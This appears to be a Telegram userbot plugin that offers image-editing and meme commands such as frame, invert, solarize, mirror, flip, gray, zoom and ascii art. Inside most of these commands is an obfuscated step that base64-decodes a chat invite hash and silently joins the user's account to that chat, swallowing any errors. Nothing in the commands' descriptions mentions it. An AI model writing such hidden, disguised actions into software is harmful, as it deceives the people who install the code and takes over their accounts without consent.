# Credits to @sandy1709 (@mrconfused)
#
# Forked, developed and edited for @DogeUserbot
#
import asyncio
import base64
import io
import os
import random
import string

from PIL import Image, ImageFilter
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from userbot import doge

from ..core.managers import edit_delete, edit_or_reply
from ..helpers import asciiart, dog_meeme, dog_meme, media_type
from ..helpers.functions import (
    add_frame,
    convert_toimage,
    convert_tosticker,
    crop,
    flip_image,
    grayscale,
    invert_colors,
    mirror_file,
    solarize,
)
from ..helpers.utils import _dogetools, reply_id
from ..sql_helper.globals import addgvar, gvarstatus

plugin_category = "fun"


def random_color():
    number_of_colors = 2
    return [
        "#" + "".join(random.choice("0123456789ABCDEF") for j in range(6))
        for i in range(number_of_colors)
    ]


FONTS = "1. `Productsans_BoldItalic.ttf`\n2. `ProductSans_Light.ttf`\n3. `Roadrage_Regular.ttf`\n4. `Digital.ttf`\n5. `Impact.ttf`"
font_list = [
    "Productsans_BoldItalic.ttf",
    "ProductSans_Light.ttf",
    "Roadrage_Regular.ttf",
    "Digital.ttf",
    "Impact.ttf",
]


@doge.ub(
    pattern="pframe(f|-f)?$",
    command=("pframe", plugin_category),
    info={
        "header": "Adds frame for the replied image.",
        "flags": {
            "-f": "To send output file not as streamble image.",
        },
        "usage": [
            "{tr}pframe",
        ],
    },
)
async def maccmd(event):  # sourcery no-metrics
    "Adds frame for the replied image."
    reply = await event.get_reply_message()
    mediatype = media_type(reply)
    if not reply or not mediatype or mediatype not in ["Photo", "Sticker"]:
        return await edit_delete(event, "__Reply to photo or sticker to frame it.__")
    if mediatype == "Sticker" and reply.document.mime_type == "application/i-tgsticker":
        return await edit_delete(
            event,
            "__Reply to photo or sticker to frame it. Animated sticker is not supported__",
        )
    dogevent = await event.edit("__Adding frame for media....__")
    args = event.pattern_match.group(1)
    force = bool(args)
    try:
        imag = await _dogetools.media_to_pic(dogevent, reply, noedits=True)
        if imag[1] is None:
            return await edit_delete(
                imag[0], "__Unable to extract image from the replied message.__"
            )
        image = Image.open(imag[1])
    except Exception as e:
        return await edit_delete(
            dogevent, f"**Error in identifying image:**\n__{str(e)}__"
        )
    wid, hgt = image.size
    img = Image.new("RGBA", (wid, hgt))
    scale = min(wid // 100, hgt // 100)
    temp = Image.new("RGBA", (wid + scale * 40, hgt + scale * 40), "#fff")
    if image.mode == "RGBA":
        img.paste(image, (0, 0), image)
        newimg = Image.new("RGBA", (wid, hgt))
        for N in range(wid):
            for O in range(hgt):
                if img.getpixel((N, O)) != (0, 0, 0, 0):
                    newimg.putpixel((N, O), (0, 0, 0))
    else:
        img.paste(image, (0, 0))
        newimg = Image.new("RGBA", (wid, hgt), "black")
    newimg = newimg.resize((wid + scale * 5, hgt + scale * 5))
    temp.paste(
        newimg,
        ((temp.width - newimg.width) // 2, (temp.height - newimg.height) // 2),
        newimg,
    )
    temp = temp.filter(ImageFilter.GaussianBlur(scale * 5))
    temp.paste(
        img, ((temp.width - img.width) // 2, (temp.height - img.height) // 2), img
    )
    output = io.BytesIO()
    output.name = (
        "-".join(
            "".join(random.choice(string.hexdigits) for img in range(event))
            for event in [5, 4, 3, 2, 1]
        )
        + ".png"
    )
    temp.save(output, "PNG")
    output.seek(0)
    await event.client.send_file(
        event.chat_id, output, reply_to=reply, force_document=force
    )
    await dogevent.delete()
    if os.path.exists(output):
        os.remove(output)


@doge.ub(
    pattern="(mmf|mms)(?:\s|$)([\s\S]*)",
    command=("mmf", plugin_category),
    info={
        "header": "To write text on stickers or images.",
        "description": "To create memes.",
        "options": {
            "mmf": "Output will be image.",
            "mms": "Output will be sticker.",
        },
        "usage": [
            "{tr}mmf toptext ; bottomtext",
            "{tr}mms toptext ; bottomtext",
        ],
        "examples": [
            "{tr}mmf hello (only on top)",
            "{tr}mmf ; hello (only on bottom)",
            "{tr}mmf hi ; hello (both on top and bottom)",
        ],
    },
)
async def memes(event):
    "To write text on stickers or image"
    cmd = event.pattern_match.group(1)
    dogeinput = event.pattern_match.group(2)
    reply = await event.get_reply_message()
    if not reply:
        return await edit_delete(event, "`Reply to supported Media...`")
    dogeid = await reply_id(event)
    san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    if not dogeinput:
        return await edit_delete(
            event, "`what should i write on that u idiot give text to memify`"
        )
    if ";" in dogeinput:
        top, bottom = dogeinput.split(";", 1)
    else:
        top = dogeinput
        bottom = ""
    if not os.path.isdir("./temp"):
        os.mkdir("./temp")
    output = await _dogetools.media_to_pic(event, reply)
    if output[1] is None:
        return await edit_delete(
            output[0], "__Unable to extract image from the replied message.__"
        )
    try:
        san = Get(san)
        await event.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(output[1])
    meme = os.path.join("./temp", "dogememe.jpg")
    if gvarstatus("CNG_FONTS") is None:
        CNG_FONTS = "userbot/helpers/styles/otherfonts/Impact.ttf"
    else:
        CNG_FONTS = gvarstatus("CNG_FONTS")
    if max(len(top), len(bottom)) < 21:
        await dog_meme(CNG_FONTS, top, bottom, meme_file, meme)
    else:
        await dog_meeme(top, bottom, CNG_FONTS, meme_file, meme)
    if cmd != "mmf":
        meme = convert_tosticker(meme)
    await event.client.send_file(
        event.chat_id, meme, reply_to=dogeid, force_document=False
    )
    await output[0].delete()
    for files in (meme, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@doge.ub(
    pattern="cfont(?:\s|$)([\s\S]*)",
    command=("cfont", plugin_category),
    info={
        "header": "Change the font style use for memify.To get font list use cfont command as it is without input.",
        "usage": "{tr}.cfont <Font Name>",
        "examples": "{tr}cfont Roadrage_Regular.ttf",
    },
)
async def cffont(event):
    "Change the font style use for memify."
    input_str = event.pattern_match.group(1)
    if not input_str:
        await event.edit(f"**Available Fonts names are here:-**\n\n{FONTS}")
        return
    if input_str not in font_list:
        dogevent = await edit_or_reply(event, "`Give me a correct font name...`")
        await asyncio.sleep(1)
        await dogevent.edit(f"**Available Fonts names are here:-**\n\n{FONTS}")
    else:
        arg = (
            f"userbot/helpers/styles/{input_str}"
            or f"userbot/helpers/styles/otherfonts/{input_str}"
        )
        addgvar("CNG_FONTS", arg)
        await edit_or_reply(event, f"**Fonts for Memify changed to :-** `{input_str}`")


@doge.ub(
    pattern="ascii(?:\s|$)([\s\S]*)",
    command=("ascii", plugin_category),
    info={
        "header": "To get ascii image of replied image.",
        "description": "pass hexa colou code along with the cmd to change custom background colour",
        "usage": [
            "{tr}ascii <hexa colour code>",
            "{tr}ascii",
        ],
    },
)
async def memes(event):
    "To get ascii image of replied image."
    dogeinput = event.pattern_match.group(1)
    reply = await event.get_reply_message()
    if not reply:
        return await edit_delete(event, "`Reply to supported Media...`")
    san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    dogeid = await reply_id(event)
    if not os.path.isdir("./temp"):
        os.mkdir("./temp")
    teledoge = None
    output = await _dogetools.media_to_pic(event, reply)
    if output[1] is None:
        return await edit_delete(
            output[0], "__Unable to extract image from the replied message.__"
        )
    meme_file = convert_toimage(output[1])
    if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
        teledoge = True
    try:
        san = Get(san)
        await event.client(san)
    except BaseException:
        pass
    outputfile = (
        os.path.join("./temp", "ascii_file.webp")
        if teledoge
        else os.path.join("./temp", "ascii_file.jpg")
    )
    c_list = random_color()
    color1 = c_list[0]
    color2 = c_list[1]
    bgcolor = "#080808" if not dogeinput else dogeinput
    asciiart(meme_file, 0.3, 1.9, outputfile, color1, color2, bgcolor)
    await event.client.send_file(
        event.chat_id, outputfile, reply_to=dogeid, force_document=False
    )
    await output[0].delete()
    for files in (outputfile, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@doge.ub(
    pattern="invert$",
    command=("invert", plugin_category),
    info={
        "header": "To invert colours of given image or sticker.",
        "usage": "{tr}invert",
    },
)
async def memes(event):
    reply = await event.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(event, "`Reply to supported Media...`")
        return
    san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    dogeid = await reply_id(event)
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    teledoge = None
    output = await _dogetools.media_to_pic(event, reply)
    if output[1] is None:
        return await edit_delete(
            output[0], "__Unable to extract image from the replied message.__"
        )
    meme_file = convert_toimage(output[1])
    if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
        teledoge = True
    try:
        san = Get(san)
        await event.client(san)
    except BaseException:
        pass
    outputfile = (
        os.path.join("./temp", "invert.webp")
        if teledoge
        else os.path.join("./temp", "invert.jpg")
    )
    await invert_colors(meme_file, outputfile)
    await event.client.send_file(
        event.chat_id, outputfile, force_document=False, reply_to=dogeid
    )
    await output[0].delete()
    for files in (outputfile, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@doge.ub(
    pattern="solarize$",
    command=("solarize", plugin_category),
    info={
        "header": "To sun burn the colours of given image or sticker.",
        "usage": "{tr}solarize",
    },
)
async def memes(event):
    "Sun burn of image."
    reply = await event.get_reply_message()
    if not reply:
        return await edit_delete(event, "`Reply to supported Media...`")
    san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    dogeid = await reply_id(event)
    if not os.path.isdir("./temp"):
        os.mkdir("./temp")
    teledoge = None
    output = await _dogetools.media_to_pic(event, reply)
    if output[1] is None:
        return await edit_delete(
            output[0], "__Unable to extract image from the replied message.__"
        )
    meme_file = convert_toimage(output[1])
    if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
        teledoge = True
    try:
        san = Get(san)
        await event.client(san)
    except BaseException:
        pass
    outputfile = (
        os.path.join("./temp", "solarize.webp")
        if teledoge
        else os.path.join("./temp", "solarize.jpg")
    )
    await solarize(meme_file, outputfile)
    await event.client.send_file(
        event.chat_id, outputfile, force_document=False, reply_to=dogeid
    )
    await output[0].delete()
    for files in (outputfile, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@doge.ub(
    pattern="mirror$",
    command=("mirror", plugin_category),
    info={
        "header": "shows you the reflection of the media file.",
        "usage": "{tr}mirror",
    },
)
async def memes(event):
    "shows you the reflection of the media file"
    reply = await event.get_reply_message()
    if not reply:
        return await edit_delete(event, "`Reply to supported Media...`")
    san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    dogeid = await reply_id(event)
    if not os.path.isdir("./temp"):
        os.mkdir("./temp")
    teledoge = None
    output = await _dogetools.media_to_pic(event, reply)
    if output[1] is None:
        return await edit_delete(
            output[0], "__Unable to extract image from the replied message.__"
        )
    meme_file = convert_toimage(output[1])
    if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
        teledoge = True
    try:
        san = Get(san)
        await event.client(san)
    except BaseException:
        pass
    outputfile = (
        os.path.join("./temp", "mirror_file.webp")
        if teledoge
        else os.path.join("./temp", "mirror_file.jpg")
    )
    await mirror_file(meme_file, outputfile)
    await event.client.send_file(
        event.chat_id, outputfile, force_document=False, reply_to=dogeid
    )
    await output[0].delete()
    for files in (outputfile, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@doge.ub(
    pattern="flip$",
    command=("flip", plugin_category),
    info={
        "header": "shows you the upside down image of the given media file.",
        "usage": "{tr}flip",
    },
)
async def memes(event):
    "shows you the upside down image of the given media file"
    reply = await event.get_reply_message()
    if not reply:
        return await edit_delete(event, "`Reply to supported Media...`")
    san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    dogeid = await reply_id(event)
    if not os.path.isdir("./temp"):
        os.mkdir("./temp")
    teledoge = None
    output = await _dogetools.media_to_pic(event, reply)
    if output[1] is None:
        return await edit_delete(
            output[0], "__Unable to extract image from the replied message.__"
        )
    meme_file = convert_toimage(output[1])
    if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
        teledoge = True
    try:
        san = Get(san)
        await event.client(san)
    except BaseException:
        pass
    outputfile = (
        os.path.join("./temp", "flip_image.webp")
        if teledoge
        else os.path.join("./temp", "flip_image.jpg")
    )
    await flip_image(meme_file, outputfile)
    await event.client.send_file(
        event.chat_id, outputfile, force_document=False, reply_to=dogeid
    )
    await output[0].delete()
    for files in (outputfile, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@doge.ub(
    pattern="gray$",
    command=("gray", plugin_category),
    info={
        "header": "makes your media file to black and white.",
        "usage": "{tr}gray",
    },
)
async def memes(event):
    "makes your media file to black and white"
    reply = await event.get_reply_message()
    if not reply:
        return await edit_delete(event, "`Reply to supported Media...`")
    san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    dogeid = await reply_id(event)
    if not os.path.isdir("./temp"):
        os.mkdir("./temp")
    teledoge = None
    output = await _dogetools.media_to_pic(event, reply)
    if output[1] is None:
        return await edit_delete(
            output[0], "__Unable to extract image from the replied message.__"
        )
    meme_file = convert_toimage(output[1])
    if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
        teledoge = True
    try:
        san = Get(san)
        await event.client(san)
    except BaseException:
        pass
    outputfile = (
        os.path.join("./temp", "grayscale.webp")
        if teledoge
        else os.path.join("./temp", "grayscale.jpg")
    )
    await grayscale(meme_file, outputfile)
    await event.client.send_file(
        event.chat_id, outputfile, force_document=False, reply_to=dogeid
    )
    await output[0].delete()
    for files in (outputfile, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@doge.ub(
    pattern="zoom ?([\s\S]*)",
    command=("zoom", plugin_category),
    info={
        "header": "zooms your media file,",
        "usage": ["{tr}zoom", "{tr}zoom range"],
    },
)
async def memes(event):
    "zooms your media file."
    dogeinput = event.pattern_match.group(1)
    dogeinput = 50 if not dogeinput else int(dogeinput)
    reply = await event.get_reply_message()
    if not reply:
        return await edit_delete(event, "`Reply to supported Media...`")
    san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    dogeid = await reply_id(event)
    if not os.path.isdir("./temp"):
        os.mkdir("./temp")
    teledoge = None
    output = await _dogetools.media_to_pic(event, reply)
    if output[1] is None:
        return await edit_delete(
            output[0], "__Unable to extract image from the replied message.__"
        )
    meme_file = convert_toimage(output[1])
    if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
        teledoge = True
    try:
        san = Get(san)
        await event.client(san)
    except BaseException:
        pass
    outputfile = (
        os.path.join("./temp", "zoomimage.webp")
        if teledoge
        else os.path.join("./temp", "zoomimage.jpg")
    )
    try:
        await crop(meme_file, outputfile, dogeinput)
    except Exception as e:
        return await output[0].edit(f"`{e}`")
    try:
        await event.client.send_file(
            event.chat_id, outputfile, force_document=False, reply_to=dogeid
        )
    except Exception as e:
        return await output[0].edit(f"`{e}`")
    await output[0].delete()
    for files in (outputfile, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@doge.ub(
    pattern="frame ?([\s\S]*)",
    command=("frame", plugin_category),
    info={
        "header": "make a frame for your media file.",
        "fill": "This defines the pixel fill value or color value to be applied. The default value is 0 which means the color is black.",
        "usage": ["{tr}frame", "{tr}frame range", "{tr}frame range ; fill"],
    },
)
async def memes(event):
    "make a frame for your media file"
    dogeinput = event.pattern_match.group(1)
    if not dogeinput:
        dogeinput = "50"
    if ";" in str(dogeinput):
        dogeinput, colr = dogeinput.split(";", 1)
    else:
        colr = 0
    dogeinput = int(dogeinput)
    try:
        colr = int(colr)
    except Exception as e:
        return await edit_delete(event, f"**Error**\n`{e}`")
    reply = await event.get_reply_message()
    if not reply:
        return await edit_delete(event, "`Reply to supported Media...`")
    san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    dogeid = await reply_id(event)
    if not os.path.isdir("./temp"):
        os.mkdir("./temp")
    teledoge = None
    output = await _dogetools.media_to_pic(event, reply)
    if output[1] is None:
        return await edit_delete(
            output[0], "__Unable to extract image from the replied message.__"
        )
    meme_file = convert_toimage(output[1])
    if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
        teledoge = True
    try:
        san = Get(san)
        await event.client(san)
    except BaseException:
        pass
    outputfile = (
        os.path.join("./temp", "framed.webp")
        if teledoge
        else os.path.join("./temp", "framed.jpg")
    )
    try:
        await add_frame(meme_file, outputfile, dogeinput, colr)
    except Exception as e:
        return await output[0].edit(f"`{e}`")
    try:
        await event.client.send_file(
            event.chat_id, outputfile, force_document=False, reply_to=dogeid
        )
    except Exception as e:
        return await output[0].edit(f"`{e}`")
    await event.delete()
    await output[0].delete()
    for files in (outputfile, meme_file):
        if files and os.path.exists(files):
            os.remove(files)
